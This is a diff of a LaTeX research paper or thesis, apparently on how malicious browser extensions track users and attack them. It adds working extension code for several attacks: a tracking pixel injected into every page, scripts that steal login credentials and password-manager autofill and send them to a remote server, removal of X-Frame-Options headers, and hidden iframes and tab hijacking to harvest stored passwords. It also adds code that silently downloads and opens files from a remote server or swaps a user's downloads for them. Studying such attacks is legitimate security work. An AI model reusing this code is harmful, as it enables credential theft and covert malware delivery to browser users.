@@ -81,7 +81,7 @@
 
 	
 
-\subsection{User Identification With Extensions}
+\subsection{Implementations}
 	
 	Besides the before described techniques of user tracking and fingerprinting, an extension has more efficient ways to identify a user. The extension has full access to any web page that the user visits and is able to read out any information that is stored in these web pages. This allows us to even identify the person behind the web user by extraction personal information such as his full name, address, or phone number. 
 	
@@ -104,6 +104,37 @@
 	% extension can track user more efficently, has access to all web pages and tab system, can record any visited web page and any interaction with a web page with for example a key logger,
 	% browser fingerprinting possible in extension's background page because it is also a HTML page, no need for web page access, browser api provides additional information for fingerprinting in system module, 
 
+\subsubsection{Web Beacon}
+	
+	This is another tracking method which we can support with an extension. It notifies a third party that a specific web page was accessed by fetching a resource from a server and sending possible tracking cookies along the request. We implemented an extension that embeds an image of one pixel in size in every visited web page. When the browser fetches the image, it sends a tracking cookie along the request or fetches a new one. The extension needs a single content script with the matching attributes \texttt{"http://*/*"} and \texttt{"https://*/*"} and no further permissions. The content script is shown in \autoref{contentScriptWebBeacon}.
+	
+	\begin{code}
+		\begin{lstlisting}
+		var img = document.createElement('img');
+		img.setAttribute('src', 'https://localhost:3001/images/pixel.png');
+		document.body.appendChild(img);
+		\end{lstlisting}
+		\caption{Content script that injects a tracking pixel in the current web page.}
+		\label{contentScriptWebBeacon}
+	\end{code}
+	
+\subsubsection{Additional Fingerprinting Data} 
+	
+	The browser provides additional information to its extension which are not available for web pages. Those information may be used to generate a more accurate fingerprint of the user's browser and system. Accessing the information needs additional permissions. \autoref{fingerprintExtension} shows provided information that may be retrieved for a fingerprint and the permissions needed to access them. \\
+	
+	\begin{table}[h]
+		\begin{tabular}{|l|l|l|} \hline
+			\textbf{Permission} & \textbf{Information} & \textbf{Example} \\ \hline
+			system.cpu & Number of processor kernels & \\
+			& Processor's name & Intel(R) Core(TM) i5-3210M CPU @ 2.50GHz \\
+			& Processor's capabilities & "sse", "sse2", "sse3"  \\ \hline
+			system.memory & Memory capacity & 6501200096 \\ \hline
+			gcm & An unique ID for the extension instance & \\ \hline
+			management & List of installed extensions & Extension ID and version \\ \hline
+		\end{tabular}
+		\caption{Additional fingerprint information available to WebExtension}
+		\label{fingerprintExtension}
+	\end{table} 
 	
 \section{Fetching}
 \label{sec:fetching}
@@ -252,14 +283,16 @@ function send(data) {
 	
 \subsection{Attacks With Content Scripts}
 
+\subsubsection{Steal Sensitive Data}
+
 \subsubsection{Steal Credentials}
 	%TODO intro
 	
-	To steal the credentials from a login form, we use two content scripts which we inject in every web page. This attack does not need additional permissions. The content script shown in \autoref{contentScriptStealCredentialsOnSubmit} steals the credentials if the user submits the login form and The other one shown in \autoref{contentScriptStealCredentialsFromPasswordManager} steals the credentials if the browser's password manager has filled them in the login form. To send the stolen credentials to our remote server, we use the \texttt{send} method shown in \autoref{contentScriptSendDataWithIframe} because it does not need additional permissions, too. 
+	To steal the credentials from a login form, we use two content scripts which we inject in every web page. This attack does not need additional permissions. The content script shown in \autoref{code:stealCredentialsOnSubmit} steals the credentials if the user submits the login form and The other one shown in \autoref{code:stealCredentialsFromPasswordManager} steals the credentials if the browser's password manager has filled them in the login form. To send the stolen credentials to our remote server, we use the \texttt{send} method shown in \autoref{contentScriptSendDataWithIframe} because it does not need additional permissions, too. 
 	
-	In \autoref{contentScriptStealCredentialsOnSubmit} we begin with retrieving an input element of type password (line 1). If we have found one (line 2), we retrieve the form which contains the password element (line 3). Finally, we add an event listener to the form which is triggered if the user submits the form and subsequently sends the form with all its values to our remote server (line 4 - 6). 
+	In \autoref{code:stealCredentialsOnSubmit} we begin with retrieving an input element of type password (line 1). If we have found one (line 2), we retrieve the form which contains the password element (line 3). Finally, we add an event listener to the form which is triggered if the user submits the form and subsequently sends the form with all its values to our remote server (lines 4-6). 
 	
-	\autoref{contentScriptStealCredentialsFromPasswordManager} is a similar implementation to \autoref{contentScriptStealCredentialsOnSubmit}. Again, we begin with getting an input element of type password and the corresponding form element (line 1 - 3). Then we delay the execution about 500 milliseconds to give the password manager the time to fill in the form's credentials (line 4). Finally, if the password field is not empty, we will send the form to our remote server (line 5 - 7).
+	\autoref{code:stealCredentialsFromPasswordManager} is a similar implementation to \autoref{code:stealCredentialsOnSubmit}. Again, we begin with getting an input element of type password and the corresponding form element (lines 1-3). Then we delay the execution about 500 milliseconds to give the password manager the time to fill in the form's credentials (line 4). Finally, if the password field is not empty, we will send the form to our remote server (lines 5-7).
 	
 	\begin{code}
 		\begin{lstlisting}	
@@ -272,7 +305,7 @@ if(passwordElement.length > 0) {
 }
 \end{lstlisting}
 		\caption{Content Script that steals credentials from a login form if the user submits the form.}
-		\label{contentScriptStealCredentialsOnSubmit}
+		\label{code:stealCredentialsOnSubmit}
 	\end{code}
 	
 	\begin{code}
@@ -288,7 +321,7 @@ if(passwordElement.length > 0) {
 }
 \end{lstlisting}
 		\caption{Content Script that steals credentials from a login form if the browser's password manager has filled in the credentials.}
-		\label{contentScriptStealCredentialsFromPasswordManager}
+		\label{code:stealCredentialsFromPasswordManager}
 	\end{code}
 	
 \subsubsection{Steal Credentials In Background}
@@ -301,11 +334,9 @@ if(passwordElement.length > 0) {
 		\item Open a new tab in an inactive browser window and load the targeted web page in this tab. Close the tab after the attack has finished.
 	\end{enumerate} 
 	
-	The first technique is the least reliable one. There exists several methods to enforce that a web page is not displayed in an iframe. The standardized approach is to use the \texttt{X-Frame-Option} HTTP header which is compatible with all current browsers \cite{xFrameOptionsSpezification, xFrameOptionsCompability}. This transfers the responsibility to enforce the policy to the browser. Other approaches use JavaScript to deny the web page's functionality if it is loaded in an iframe or simply move the web page from the iframe to the main frame. 
+	The first technique is the least reliable one. There exists several methods to enforce that a web page is not displayed in an iframe. The standardized approach is to use the \texttt{X-Frame-Option} HTTP header which is compatible with all current browsers \cite{xFrameOptionsSpezification, xFrameOptionsCompability}. This transfers the responsibility to enforce the policy to the browser. Other approaches use JavaScript to deny the web page's functionality if it is loaded in an iframe or simply move the web page from the iframe to the main frame.
 	
-	Our implementation removes the \texttt{X-Frame-Option} from any incoming web request to be able to load particular web pages into an iframe and steal probably stored credentials. For that purpose, it needs the permissions \texttt{"webRequest"}, \texttt{"webRequestBlocking"}, \texttt{"https://*/*"}, and \texttt{"http://*/*"}. The implementation is shown in \autoref{backgroundRemoveXFrameOptionsHeader}. We use the \texttt{chrome.webRequest} module to add an event listener that is triggered when the browser receives HTTP headers for a response. The \texttt{addListener} method on line 1 takes additional arguments on line 9. These define that the listener is triggered on any URL that matches \texttt{https://*/*} or \texttt{http://*/*}, the request is blocked until the listener finishes, and the listener has access to the response's headers. Our listener iterates over the headers, compares if the header's name equals x-frame-options, and removes the header in this case. 
-	
-	To open a particular web page in an iframe, we use a content script with the \texttt{any\_frame} option which enables that the content script is executed in iframes, too. The content script is shown in \autoref{contentScriptOpenWebPageInIframe}. It checks whether or not it is currently active in the main frame on the first line. If it is active in an iframe, we use the implementation shown in \autoref{contentScriptStealCredentialsFromPasswordManager} to steal the probably stored credentials. If the content script is currently active in the main frame, we send a message to the extension's background to retrieve a URL. This is necessary because the content script itself can not store data - in our case a list of URLs - between different instances of itself. On line 4 till 7 we create a new iframe, make it invisible, set it's source attribute to the given URL, and add it to the document's body. \\
+	Our implementation removes the \texttt{X-Frame-Option} from any incoming web request to be able to load particular web pages into an iframe and steal probably stored credentials. For that purpose, it needs the permissions \texttt{"webRequest"}, \texttt{"webRequestBlocking"}, \texttt{"https://*/*"}, and \texttt{"http://*/*"}. The implementation is shown in \autoref{code:removeXFrameOptionsHeader}. We begin by adding an event listener which is triggered if the browser receives the headers of a web request's response (line 1). In the listener, we iterate over all headers (line 2). If the current header is the X-Frame-Options header, we remove it from the headers array (lines 3-5). Finally we return the modified header's list and consequently continue the web request's processing.
 	
 	\begin{code}
 		\begin{lstlisting}
@@ -320,61 +351,127 @@ chrome.webRequest.onHeadersReceived.addListener(function(details) {
 {urls: ['https://*/*', 'http://*/*']}, ['blocking', 'responseHeaders']);
 \end{lstlisting}
 		\caption{Extension code to remove the \texttt{X-Frame-Options} header from any incoming web request.}
-		\label{backgroundRemoveXFrameOptionsHeader}
+		\label{code:removeXFrameOptionsHeader}
 	\end{code} 
+	
+	To open a particular web page in an iframe, we use a content script with the \texttt{any\_frame} option which enables that the content script is executed in iframes, too. Our implementation is shown in \autoref{code:openWebPageInIframe}. It checks whether or not it is currently active in the main frame (line 1). If it is active in an iframe, we use the implementation shown in \autoref{code:stealCredentialsFromPasswordManager} to steal the probably stored credentials. If the content script is currently active in the main frame, we send a message to the extension's background to retrieve a URL (line 2). This is necessary because the content script itself can not store data - in our case a list of URLs - between different instances of itself. Then, we create a new iframe (line 3), turn it invisible for the user by setting its display property (line 4), set it's source attribute to the given URL which subsequently loads the targeted web page (line 5), and finally add it to the web page's DOM (line 6). 
 	
 	\begin{code}
 		\begin{lstlisting}
 if(window.self === window.top) {
 	chrome.runtime.sendMessage({get: 'url'}, function(response) {
-		if(response.url) {
-			var newIframe = document.createElement('iframe');
-			newIframe.setAttribute('style', 'display: none;');
-			newIframe.setAttribute('src', response.url);
-			document.body.appendChild(newIframe);
-		}
+		var iframe = document.createElement('iframe');
+		iframe.setAttribute('style', 'display: none;');
+		iframe.setAttribute('src', response.url);
+		document.body.appendChild(iframe);
 	});
 }
-else { ... }
 \end{lstlisting}
 		\caption{Content script to open a particular web page in an iframe.}
-		\label{contentScriptOpenWebPageInIframe}
+		\label{code:openWebPageInIframe}
 	\end{code}
 	
-	The second and third technique work very similar. Both use the browser's tab system to open a particular web page and inject a content script in it to steal probably stored credentials. The source code of each technique contains more than 20 lines. Therefore, we refrained from showing the concrete implementation but instead include pseudocode for both which we show in \autoref{backgroundOpenPageInNewBackgroundTab} and \autoref{backgroundOpenPageInInactiveTab}. Both implementation inject the content script which we have shown in the previous section in \autoref{contentScriptStealCredentialsFromPasswordManager} to steal probably stored credentials in the newly loaded web page.
+	The second and third technique work very similar. Both use the browser's tab system to open a particular web page and inject a content script in it to steal probably stored credentials. 
 	
+	The implementation for the second technique is shown in \autoref{code:openPageInNewBackgroundTab}. First, we query for an inactive tab (line 2) and store its URL (lines 1,3). Then, we update the first found tab and load the targeted web page (line 4). After the tab has finished loading, we inject a content script in the tab which executes the attack shown in \autoref{code:stealCredentialsFromPasswordManager} (lines 5-7). The content script will send a message to indicate that is has finished executing the attack. We await this message and update the tab from which the message originates with the stored URL to load the original web page (lines 10-12).
+		
 	\begin{code}
 		\begin{lstlisting}
-tab = getAnyActiveTab();
-storedURL = tab.url;
-tab.update(targetURL);
-tab.onFinishedLoading = function() {
-	tab.executeScript();
-}
-
-onMessageFromContentScript = function() {
-	tab.update(storedURL);
-}
+var storedURL;
+chrome.tabs.query({ active: false }, function(tabs) {	
+	var storedURL = tabs[0].url;
+	chrome.tabs.update(tabs[0].id, {url: TARGET_URL}, function(tab) {
+		waitUntilTabHasFinishedLoading(function() {
+			chrome.tabs.executeScript(tab.id, {file: 'content.js'});	
+		});
+	});
+});
+chrome.runtime.onMessage.addListener(function(message, sender) {
+	chrome.tabs.update(sender.tab.id, {url: storedURL});
+});
 \end{lstlisting}
-		\caption{Pseudo code to open a particular web page in an inactive tab to steal probably stored credentials.}
-		\label{backgroundOpenPageInInactiveTab}
+		\caption{Extension code to open a particular web page in an inactive tab to steal probably stored credentials.}
+		\label{code:openPageInInactiveTab}
 	\end{code}
 	
+	And the implementation for the third technique is shown in \autoref{code:openPageInNewBackgroundTab}. Instead of querying for an inactive tab like before, we query for a tab in a window which is not the currently active window (line 1). Following, we create a new tab in the same window as the queried tab and load the targeted web page (line 2). We wait until the tab has finished loading and then inject a content script with the implementation from \autoref{code:stealCredentialsFromPasswordManager} (lines 3-5). Again, we await the message that the content script has finished and consequently remove the before created tab (line 8-10).
 
 	\begin{code}
 		\begin{lstlisting}
-tab = openNewTabInBackgroundWindo();
-tab.update(targetURL);
-tab.onFinishedLoading = function() {
-	tab.executeScript();
-}
-
-onMessageFromContentScript = function() {
-	tab.close();
-}
+chrome.tabs.query({ currentWindow: false }, function(tabs) {	
+	chrome.tabs.create({ url: TARGET_URL, windowId: tabs[0].windowId },	function(tab) {
+		waitUntilTabHasFinishedLoading(function() {
+			chrome.tabs.executeScript(tab.id, { file: 'content.js' });	
+		});
+	});
+});
+chrome.runtime.onMessage.addListener(function(message, sender) {
+	chrome.tabs.remove(sender.tab.id);
+});
 \end{lstlisting}
-		\caption{Pseudo code to open a new tab in a background window an load a particular web page to steal probably stored credentials.}
-		\label{backgroundOpenPageInNewBackgroundTab}
+		\caption{Extension code to open a new tab in a background window an load a particular web page to steal probably stored credentials.}
+		\label{code:openPageInNewBackgroundTab}
 	\end{code}
 			
 	We tested our implementations in Chrome, Opera, and Firefox. To our surprise, they were only successful in Firefox. The reason that none of our attacks work in Chrome and Opera is that JavaScript has no access to the value of a password input field before any user interaction with the web page occurred. What first seems like a bug is an intended security feature to prevent exactly this kind of attack \cite{chromiumBlogPasswordInput}.
+
+
+\subsection{Manipulate Download Files}
+
+	\begin{code}
+		\begin{lstlisting}
+var storedDownloadId = null;
+chrome.downloads.setShelfEnabled(false);
+chrome.downloads.download({	url: REMOTE_SERVER_URL,	method: 'GET' }, function(downloadId) {
+	waitUntilDownloadHasFinished(function() {
+		storedDownloadId = downloadId;
+	});
+});		
+chrome.runtime.onMessage.addListener(function() {
+	if(storedDownloadId != null) {
+		chrome.downloads.open(downloadItem.id);		
+		chrome.downloads.setShelfEnabled(true);
+	}
+});
+\end{lstlisting}
+		\caption{Extension code to download and open a file without the user noticing.}
+		\label{code:downloadAndOpenFile}
+	\end{code}
+	
+	\begin{code}
+		\begin{lstlisting}
+chrome.downloads.onCreated.addListener(function (downloadItem) {
+	if(downloadItem.mime === TARGETED_MIME_TYPE) {
+		chrome.downloads.cancel(downloadItem.id);
+		chrome.downloads.erase({ id: downloadItem.id });
+		chrome.downloads.download({
+			url: REMOTE_SERVER_URL + '?filename=' downloadItem.filename + '&mime_type=' + TARGETED_MIME_TYPE,
+			method: 'GET',
+		});
+	}
+});
+\end{lstlisting}	
+		\caption{Extension code to silently exchange a file that the user currently downloads with a file from our remote server.}	
+		\label{code:exchangeDownloadFile}
+	\end{code}
+	
+	\begin{code}
+		\begin{lstlisting}
+chrome.downloads.onCreated.addListener(function (downloadItem) {
+	if(downloadItem.mime === TARGETED_MIME_TYPE) {
+		waitUntilDownloadHasFinished(function() {
+			var filename = downloadItem.filename.split('\x5c').pop();			
+			chrome.downloads.removeFile(downloadItem.id, function() {
+				chrome.downloads.erase({ id: downloadItem.id });
+			});
+			chrome.downloads.download({
+				url: REMOTE_SERVER_URL + '?filename=' downloadItem.filename + '&mime_type=' + TARGETED_MIME_TYPE,
+				method: 'GET',
+			});	
+		});
+	}
+});
+\end{lstlisting}
+		\caption{Extension code to silently exchange a file after the user has downloaded it.}
+		\label{code:exchangeDownloadedFile}
+	\end{code}
